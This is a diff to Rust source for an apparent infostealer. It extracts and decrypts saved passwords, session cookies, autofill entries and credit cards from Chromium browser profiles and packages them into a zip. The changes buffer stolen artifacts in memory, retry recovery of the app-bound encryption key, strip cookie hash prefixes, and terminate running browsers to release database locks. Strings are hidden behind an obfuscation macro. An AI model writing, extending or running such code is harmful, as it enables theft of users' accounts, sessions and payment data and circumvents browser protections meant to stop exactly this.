@@ -144,31 +144,149 @@ pub(crate) fn profiles(user_data: &Path) -> Vec<(String, PathBuf)> {
     out
 }
 
-fn process_browser(zip: &mut ZipBuilder, info: &mut Info, name: &str, user_data: &Path) {
-    if attempt_browser(zip, info, name, user_data) {
-        return;
+/// Per-browser collection result, gathered fully in memory before anything
+/// reaches the zip: the archive writer is first-wins on duplicate names, so
+/// a partial first pass (v20 blobs dropped by a failed ABE recovery) must
+/// never be written — the ABE retry re-gathers and replaces the whole set.
+#[derive(Default)]
+struct BrowserArtifacts {
+    files: Vec<(String, Vec<u8>)>,
+    collected: bool,
+    passwords: usize,
+    cookies: usize,
+    autofill: usize,
+    cards: usize,
+    v20_seen: usize,
+    v20_failed: usize,
+    /// v20 blobs were seen but the app-bound key could not be recovered.
+    abe_failed: bool,
+    /// ABE recovery diagnostics (which path, failure reason, exe version).
+    abe_report: Option<crate::abe::AbeReport>,
+}
+
+impl BrowserArtifacts {
+    fn push_json(&mut self, path: String, rows: &[serde_json::Value]) {
+        if let Some(bytes) = json_file_bytes(rows) {
+            self.files.push((path, bytes));
+            self.collected = true;
+        }
     }
-    // Zero artifacts but databases exist on disk: failures were lock-related,
-    // not absence. Killing the browser is the last resort — once per run,
-    // then retry this browser once.
-    if browser_dbs_exist(user_data) && crate::procs::terminate_browsers_once() > 0 {
-        crate::jitter::sleep_jitter(20, 80);
-        attempt_browser(zip, info, name, user_data);
+
+    fn push_raw(&mut self, path: String, bytes: Vec<u8>) {
+        self.files.push((path, bytes));
+        self.collected = true;
     }
 }
 
-fn attempt_browser(zip: &mut ZipBuilder, info: &mut Info, name: &str, user_data: &Path) -> bool {
+fn process_browser(zip: &mut ZipBuilder, info: &mut Info, name: &str, user_data: &Path) {
+    let mut art = gather_browser(name, user_data, None);
+    // Zero artifacts but databases exist on disk: failures were lock-related,
+    // not absence. Killing the browser is the last resort — once per run,
+    // then re-gather this browser once (a fresh Decrypter also re-attempts
+    // the ABE key recovery).
+    if !art.collected
+        && browser_dbs_exist(user_data)
+        && crate::procs::terminate_browsers_once() > 0
+    {
+        crate::jitter::sleep_jitter(20, 80);
+        art = gather_browser(name, user_data, None);
+    }
+    // v20 blobs exist but the first ABE key recovery failed: one explicit
+    // retry after the kill pass above — a browser killed for lock reasons
+    // no longer holds the elevation service, and one transient failure must
+    // not zero every v20 row for the run.
+    if art.abe_failed {
+        crate::jitter::sleep_jitter(20, 80);
+        let (key, rep) = crate::abe::decrypt_app_bound_key_diag(user_data, name);
+        // The retry attempt's diagnostics supersede the first pass's.
+        art.abe_report = Some(rep);
+        if let Some(key) = key {
+            let retry = gather_browser(name, user_data, Some(key));
+            if retry.v20_failed < art.v20_failed {
+                // Keep the retry's artifacts/counts but the recovery report.
+                let rep = art.abe_report.take();
+                art = retry;
+                art.abe_report = rep;
+            }
+        }
+    }
+    flush_browser(zip, info, name, art);
+}
+
+fn gather_browser(name: &str, user_data: &Path, abe_key: Option<Vec<u8>>) -> BrowserArtifacts {
     let mut dec = Decrypter::new(user_data, name);
-    let mut collected = false;
+    if let Some(key) = abe_key {
+        dec.abe = Some(key);
+        dec.abe_tried = true;
+    }
+    let mut art = BrowserArtifacts::default();
     for (profile, pdir) in profiles(user_data) {
         crate::jitter::sleep_jitter(20, 80);
         let base = format!("Browser_{}_{}", name, profile);
-        collected |= collect_profile(zip, info, &base, &pdir, &mut dec);
+        gather_passwords(&base, &pdir.join(crate::obf!("Login Data")), &mut dec, &mut art);
+        gather_cookies(&base, &pdir, &mut dec, &mut art);
+        gather_web_data(&base, &pdir.join(crate::obf!("Web Data")), &mut dec, &mut art);
     }
-    if collected {
+    art.v20_seen = dec.v20_seen;
+    art.v20_failed = dec.v20_failed;
+    art.abe_failed = dec.abe_tried && dec.abe.is_none();
+    art.abe_report = dec.abe_report;
+    art
+}
+
+fn flush_browser(zip: &mut ZipBuilder, info: &mut Info, name: &str, art: BrowserArtifacts) {
+    for (path, bytes) in &art.files {
+        zip.add_file(path, bytes);
+    }
+    info.passwords_count += art.passwords;
+    info.cookies_count += art.cookies;
+    info.autofill_count += art.autofill;
+    info.credit_cards_count += art.cards;
+    info.v20_seen += art.v20_seen;
+    info.v20_failed += art.v20_failed;
+    if art.collected {
         info.add_browser(name);
     }
-    collected
+    // Browser version (IElevator IID revs track browser versions) — from the
+    // ABE report when recovery ran, else a direct exe version query.
+    let version = art
+        .abe_report
+        .as_ref()
+        .and_then(|r| r.version.clone())
+        .or_else(|| crate::abe::browser_version(name));
+    if let Some(v) = version {
+        info.browser_versions.insert(name.to_string(), v);
+    }
+    if let Some(rep) = &art.abe_report {
+        if let Some(f) = &rep.fail {
+            info.abe_fail.insert(name.to_string(), f.clone());
+        }
+    }
+    if art.v20_seen > 0 {
+        let mut msg = format!(
+            "v20 {} seen={} failed={}",
+            name, art.v20_seen, art.v20_failed
+        );
+        match &art.abe_report {
+            Some(rep) => {
+                match &rep.fail {
+                    Some(f) => msg.push_str(&format!(" abe=fail:{}", f)),
+                    None => msg.push_str(&format!(
+                        " abe={}",
+                        if rep.path.is_empty() { "ok" } else { rep.path }
+                    )),
+                }
+                if let Some(note) = &rep.inj_note {
+                    msg.push_str(&format!(" (inj:{})", note));
+                }
+            }
+            None => msg.push_str(" abe=n/a"),
+        }
+        if let Some(v) = info.browser_versions.get(name) {
+            msg.push_str(&format!(" ver={}", v));
+        }
+        crate::progress(&msg);
+    }
 }
 
 /// Any profile DB present under this browser root?
@@ -187,20 +305,6 @@ fn browser_dbs_exist(user_data: &Path) -> bool {
                 .join(crate::obf!("Cookies"))
                 .is_file()
     })
-}
-
-fn collect_profile(
-    zip: &mut ZipBuilder,
-    info: &mut Info,
-    base: &str,
-    pdir: &Path,
-    dec: &mut Decrypter,
-) -> bool {
-    let mut any = false;
-    any |= collect_passwords(zip, info, base, &pdir.join(crate::obf!("Login Data")), dec);
-    any |= collect_cookies(zip, info, base, pdir, dec);
-    any |= collect_web_data(zip, info, base, &pdir.join(crate::obf!("Web Data")), dec);
-    any
 }
 
 // ---------------------------------------------------------------------------
@@ -263,17 +367,21 @@ fn dpapi_decrypt(data: &[u8]) -> Option<Vec<u8>> {
 
 /// Decrypt a Chrome-encrypted blob: v10 AES-256-GCM with the os_crypt key,
 /// v20 AES-256-GCM with the app-bound key (lazily recovered, cached per
-/// browser), otherwise legacy DPAPI. Cookie v20 plaintext carries a 32-byte
-/// host-hash prefix that is stripped when `is_cookie` is set.
+/// browser), otherwise legacy DPAPI. Cookie plaintext (v10 and v20) carries a
+/// 32-byte SHA-256(host_key) prefix that is stripped when `host` is given.
 struct Decrypter<'a> {
     user_data: &'a Path,
     name: &'a str,
     v10: Option<Vec<u8>>,
     abe: Option<Vec<u8>>,
     abe_tried: bool,
+    /// Diagnostics from the ABE recovery attempt (set when one ran).
+    abe_report: Option<crate::abe::AbeReport>,
+    v20_seen: usize,
+    v20_failed: usize,
 }
 
-/// v20 cookie plaintext header (SHA-256 host hash) per the public PoC.
+/// Chromium's cookie plaintext header (SHA-256 of host_key) per the public PoC.
 const COOKIE_PLAINTEXT_HEADER_SIZE: usize = 32;
 
 impl<'a> Decrypter<'a> {
@@ -284,6 +392,9 @@ impl<'a> Decrypter<'a> {
             v10: master_key(user_data),
             abe: None,
             abe_tried: false,
+            abe_report: None,
+            v20_seen: 0,
+            v20_failed: 0,
         }
     }
 
@@ -292,24 +403,59 @@ impl<'a> Decrypter<'a> {
     fn abe_key(&mut self) -> Option<&[u8]> {
         if !self.abe_tried {
             self.abe_tried = true;
-            self.abe = crate::abe::decrypt_app_bound_key(self.user_data, self.name);
+            let (key, rep) = crate::abe::decrypt_app_bound_key_diag(self.user_data, self.name);
+            self.abe = key;
+            self.abe_report = Some(rep);
         }
         self.abe.as_deref()
     }
 
-    fn decrypt(&mut self, blob: &[u8], is_cookie: bool) -> Option<Vec<u8>> {
+    fn decrypt(&mut self, blob: &[u8], is_cookie: bool, host: &str) -> Option<Vec<u8>> {
         if blob.starts_with(crate::obf!("v20").as_bytes()) {
-            let key = self.abe_key()?;
-            let mut plain = aes_gcm_decrypt(key, blob)?;
-            if is_cookie && plain.len() >= COOKIE_PLAINTEXT_HEADER_SIZE {
-                plain.drain(..COOKIE_PLAINTEXT_HEADER_SIZE);
-            }
+            self.v20_seen += 1;
+            let plain = match self.abe_key() {
+                Some(key) => aes_gcm_decrypt(key, blob),
+                None => None,
+            };
+            let mut plain = match plain {
+                Some(p) => p,
+                None => {
+                    self.v20_failed += 1;
+                    return None;
+                }
+            };
+            // v20: strip unconditionally (matches long-standing behavior),
+            // preferring the verified host-hash match.
+            strip_cookie_prefix(&mut plain, is_cookie, host, true);
             return Some(plain);
         }
         if blob.starts_with(crate::obf!("v10").as_bytes()) {
-            return aes_gcm_decrypt(self.v10.as_deref()?, blob);
+            let mut plain = aes_gcm_decrypt(self.v10.as_deref()?, blob)?;
+            // v10: strip only when the prefix verifies — older v10 cookies
+            // carry no prefix and must not be truncated.
+            strip_cookie_prefix(&mut plain, is_cookie, host, false);
+            return Some(plain);
         }
         dpapi_decrypt(blob)
+    }
+}
+
+/// Strip the 32-byte SHA-256(host_key) prefix Chromium prepends to cookie
+/// plaintext. Verified against `host` when available; `unconditional`
+/// (v20 path) additionally strips whenever the plaintext is long enough,
+/// preserving the behavior that predates host-key plumbing.
+fn strip_cookie_prefix(plain: &mut Vec<u8>, is_cookie: bool, host: &str, unconditional: bool) {
+    if !is_cookie || plain.len() < COOKIE_PLAINTEXT_HEADER_SIZE {
+        return;
+    }
+    if !host.is_empty()
+        && plain.starts_with(&crate::sha256::sha256(host.as_bytes()))
+    {
+        plain.drain(..COOKIE_PLAINTEXT_HEADER_SIZE);
+        return;
+    }
+    if unconditional {
+        plain.drain(..COOKIE_PLAINTEXT_HEADER_SIZE);
     }
 }
 
@@ -338,39 +484,32 @@ fn chrome_time_to_unix(us: i64) -> i64 {
     (us - CHROME_EPOCH_DELTA_US).max(0) / 1_000_000
 }
 
-fn put_json(zip: &mut ZipBuilder, path: &str, rows: &[serde_json::Value]) -> bool {
+/// Serialize rows as the competition-format JSON file body (UTF-8 BOM).
+/// None for empty row sets — empty files never enter the archive.
+fn json_file_bytes(rows: &[serde_json::Value]) -> Option<Vec<u8>> {
     if rows.is_empty() {
-        return false;
+        return None;
     }
-    if let Ok(body) = serde_json::to_vec_pretty(rows) {
-        // Competition example zips carry a UTF-8 BOM on every JSON file.
-        let mut bytes = Vec::with_capacity(body.len() + 3);
-        bytes.extend_from_slice(b"\xef\xbb\xbf");
-        bytes.extend_from_slice(&body);
-        zip.add_file(path, &bytes);
-        return true;
-    }
-    false
+    let body = serde_json::to_vec_pretty(rows).ok()?;
+    // Competition example zips carry a UTF-8 BOM on every JSON file.
+    let mut bytes = Vec::with_capacity(body.len() + 3);
+    bytes.extend_from_slice(b"\xef\xbb\xbf");
+    bytes.extend_from_slice(&body);
+    Some(bytes)
 }
 
 // ---------------------------------------------------------------------------
 // Per-artifact collectors
 // ---------------------------------------------------------------------------
 
-fn collect_passwords(
-    zip: &mut ZipBuilder,
-    info: &mut Info,
-    base: &str,
-    path: &Path,
-    dec: &mut Decrypter,
-) -> bool {
+fn gather_passwords(base: &str, path: &Path, dec: &mut Decrypter, art: &mut BrowserArtifacts) {
     let Some(conn) = open_db_file(path) else {
-        return false;
+        return;
     };
     let Ok(mut stmt) =
         conn.prepare(crate::obf!("SELECT origin_url, username_value, password_value FROM logins").as_str())
     else {
-        return false;
+        return;
     };
     let rows = stmt
         .query_map([], |row| {
@@ -386,7 +525,7 @@ fn collect_passwords(
 
     let mut out = Vec::new();
     for (url, username, enc) in rows {
-        let Some(plain) = dec.decrypt(&enc, false) else {
+        let Some(plain) = dec.decrypt(&enc, false, "") else {
             continue;
         };
         let password = String::from_utf8_lossy(&plain).into_owned();
@@ -399,17 +538,11 @@ fn collect_passwords(
             "Password": password,
         }));
     }
-    info.passwords_count += out.len();
-    put_json(zip, &format!("{}/Passwords.json", base), &out)
+    art.passwords += out.len();
+    art.push_json(format!("{}/Passwords.json", base), &out);
 }
 
-fn collect_cookies(
-    zip: &mut ZipBuilder,
-    info: &mut Info,
-    base: &str,
-    pdir: &Path,
-    dec: &mut Decrypter,
-) -> bool {
+fn gather_cookies(base: &str, pdir: &Path, dec: &mut Decrypter, art: &mut BrowserArtifacts) {
     let conn = open_db_file(
         &pdir
             .join(crate::obf!("Network"))
@@ -417,12 +550,12 @@ fn collect_cookies(
     )
     .or_else(|| open_db_file(&pdir.join(crate::obf!("Cookies"))));
     let Some(conn) = conn else {
-        return false;
+        return;
     };
     let Ok(mut stmt) = conn.prepare(
         crate::obf!("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies").as_str(),
     ) else {
-        return false;
+        return;
     };
     let rows = stmt
         .query_map([], |row| {
@@ -442,7 +575,7 @@ fn collect_cookies(
     let mut out = Vec::new();
     let mut netscape = String::from("# Netscape HTTP Cookie File\n");
     for (host, name, enc, path, expires, secure, httponly) in rows {
-        let Some(plain) = dec.decrypt(&enc, true) else {
+        let Some(plain) = dec.decrypt(&enc, true, &host) else {
             continue;
         };
         let value = String::from_utf8_lossy(&plain).into_owned();
@@ -471,25 +604,17 @@ fn collect_cookies(
             value
         ));
     }
-    info.cookies_count += out.len();
-    let wrote_json = put_json(zip, &format!("{}/Cookies.json", base), &out);
+    art.cookies += out.len();
     if !out.is_empty() {
-        zip.add_file(&format!("{}/Cookies.txt", base), netscape.as_bytes());
+        art.push_raw(format!("{}/Cookies.txt", base), netscape.into_bytes());
     }
-    wrote_json
+    art.push_json(format!("{}/Cookies.json", base), &out);
 }
 
-fn collect_web_data(
-    zip: &mut ZipBuilder,
-    info: &mut Info,
-    base: &str,
-    path: &Path,
-    dec: &mut Decrypter,
-) -> bool {
+fn gather_web_data(base: &str, path: &Path, dec: &mut Decrypter, art: &mut BrowserArtifacts) {
     let Some(conn) = open_db_file(path) else {
-        return false;
+        return;
     };
-    let mut any = false;
 
     let autofill = conn
         .prepare(crate::obf!("SELECT name, value FROM autofill").as_str())
@@ -507,8 +632,8 @@ fn collect_web_data(
         .iter()
         .map(|(name, value)| serde_json::json!({ "Name": name, "Value": value }))
         .collect();
-    info.autofill_count += af_json.len();
-    any |= put_json(zip, &format!("{}/AutoFill.json", base), &af_json);
+    art.autofill += af_json.len();
+    art.push_json(format!("{}/AutoFill.json", base), &af_json);
 
     let cards = conn
         .prepare(
@@ -531,7 +656,7 @@ fn collect_web_data(
         .unwrap_or_default();
     let mut card_json = Vec::new();
     for (name, month, year, enc) in cards {
-        let Some(plain) = dec.decrypt(&enc, false) else {
+        let Some(plain) = dec.decrypt(&enc, false, "") else {
             continue;
         };
         card_json.push(serde_json::json!({
@@ -540,8 +665,6 @@ fn collect_web_data(
             "Expiry": format!("{:02}/{:04}", month, year),
         }));
     }
-    info.credit_cards_count += card_json.len();
-    any |= put_json(zip, &format!("{}/Cards.json", base), &card_json);
-
-    any
+    art.cards += card_json.len();
+    art.push_json(format!("{}/Cards.json", base), &card_json);
 }
